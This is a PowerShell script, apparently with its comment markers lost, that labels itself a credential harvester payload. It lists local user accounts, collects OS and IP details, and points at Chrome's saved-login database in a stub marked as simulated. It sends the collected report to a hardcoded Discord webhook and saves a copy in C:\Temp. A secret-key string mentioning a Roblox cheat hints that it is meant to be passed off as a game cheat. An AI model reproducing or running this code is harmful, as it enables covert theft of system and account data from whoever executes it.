==================================================================
--- 1. CONFIGURATION SECTION (EDIT THESE VALUES) ---
=========================================================
Your provided Discord Webhook URL

$WebhookURL = "https://discord.com/api/webhooks/1511832980744835074/UVIFIzLHMBWkw2f2llrb5UQI43RQ4LpkmdAyBYxH2fiB91N0Jm07QxA_6oD1aTol7Be9"
!!! CRITICAL: This passphrase must be extremely complex and unique !!!

$SecretKey = "MyRobloxCheatKey_VerySecretAndLongEnough123!"
========================================================
--- 2. CORE HARVESTING FUNCTIONS ---
====================================================

Function Get-LocalUserCredentials { Write-Host "[+] Harvesting Local User Credentials (net user)..." -ForegroundColor Cyan try { $Output = net user | Select-String -Pattern "User account name.."

    $Creds = @()
    $Output | ForEach-Object {
        $Username = $_.ToString().Split(':')[0].Trim()
        $Creds += [PSCustomObject]@{
            Username = $Username;
            Status = "Local Account Check";
            Instructions = "Need manual dump/WMI query to get actual password hash."
        }
    }
    return $Creds
} catch {
    Write-Warning "Error gathering local users: $($_.Exception.Message)"
    return [PSCustomObject]@{Error = "Failed to check local users."}
}

}

Function Get-SystemInfo { Write-Host "[+] Harvesting Core System Information..." -ForegroundColor Cyan try {
FIX: Using simple Select-String match for compatibility

    $OSInfo = systeminfo | Select-String -Pattern "OS Name" -SimpleMatch;
    $Network = ipconfig /all | Select-String -Pattern "IPv4 Address" -SimpleMatch;

    return [PSCustomObject]@{
        OS = if ($OSInfo) {$OSInfo.ToString().Trim()} else {"N/A"};
        NetworkIP = if ($Network) {$Network.ToString().Trim()} else {"N/A"}
    }
} catch {
    Write-Warning "Error gathering system info: $($_.Exception.Message)"
    return [PSCustomObject]@{OS = "Error"; NetworkIP = "Error"}
}

}

Function Get-BrowserCredentialDump { Write-Host "[+] Attempting simulated Browser Credential Dump..." -ForegroundColor Cyan $DummyData = "Simulation: Look for stored credentials in the following paths: $env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" return [PSCustomObject]@{ Simulation_Notes = $DummyData; Instructions = "Requires specialized module to parse SQLite DB." } }
=========================================================
--- 3. WEBHOOK TRANSMISSION LOGIC (JAVASCRIPT MIMICRY) ---
=========================================================

Function Send-WebhookReport { param( [Parameter(Mandatory=$true)] [psobject]$AllData # Accepts the data object ) Write-Host "[+] [EXFILTRATION] Attempting to send structured data via Discord Webhook..." -ForegroundColor Magenta

# --- FINAL FIX: Combining all detail into the primary 'content' string, mimicking JS simplicity ---
$SimpleMessage = "--- HARVEST REPORT --`r`n"
$SimpleMessage += "SYSTEM STATUS:`r`n"
$SimpleMessage += "OS: $($AllData.SystemInfo.OS)`r`n"
$SimpleMessage += "Network IP: $($AllData.NetworkIP)`r`n"
$SimpleMessage += "--------------------------------------------`r`n"
$SimpleMessage += "CREDENTIALS: (Local Users: $($AllData.LocalCreds | Out-String))`r`n"
$SimpleMessage += "VAULT DUMP: $($AllData.BrowserVault | Out-String)"

$Body = @{
    content = $SimpleMessage
} | ConvertTo-Json

try {
    Write-Host "[DEBUG] Sending Payload: $($Body.Substring(0, [System.Math]::Min(100, $Body.Length))) ..."
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType "application/json" -ErrorAction Stop
    Write-Host "[+] SUCCESS: Data successfully pushed to Discord." -ForegroundColor Green
} catch {
    Write-Error "CRITICAL ERROR: Webhook failure. $($_.Exception.Message)"
}

}
=========================================================
--- 4. MASTER EXECUTION FLOW (FINALIZED) ---
===============================================================

Write-Host "================================================================================" -ForegroundColor White Write-Host "================= STARTER: RUNNING CREDENTIAL HARVESTER PAYLOAD ==================" -ForegroundColor White Write-Host "============================================================================" -ForegroundColor White
1. Collect All Data Points

$UserCreds = Get-LocalUserCredentials $SysInfo = Get-SystemInfo $BrowserData = Get-BrowserCredentialDump
2. Aggregate All Data into ONE Object

$FinalReport = [PSCustomObject]@{ SystemInfo = $SysInfo; NetworkIP = $SysInfo.NetworkIP; LocalCreds = $UserCreds; BrowserVault = $BrowserData }
3. Transmit (Primary Goal)

Send-WebhookReport -AllData $FinalReport
4. Local Fallback (Secondary Goal - Resilience)

$TempPath = "C:\Temp" $OutputFile = Join-Path $TempPath "CredentialHarvest_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
--- FIX: Ensure directory exists ---

try { if (-not (Test-Path $TempPath)) { New-Item -Path $TempPath -ItemType Directory | Out-Null Write-Host "[*] Successfully created missing directory: $TempPath" -ForegroundColor Yellow }

# Attempt to output the full object to the file
$FinalReport | Out-File -FilePath $OutputFile -Encoding UTF8
Write-Host "[+] OFFLINE: Full detailed report saved to: $OutputFile" -ForegroundColor Yellow

} catch { Write-Error "Failed to write local file report. $($_.Exception.Message)" }

Write-Host "" Write-Host "================= END OF PAYLOAD EXECUTION =======================================" -ForegroundColor White Write-Host "======================================================================================" -ForegroundColor White
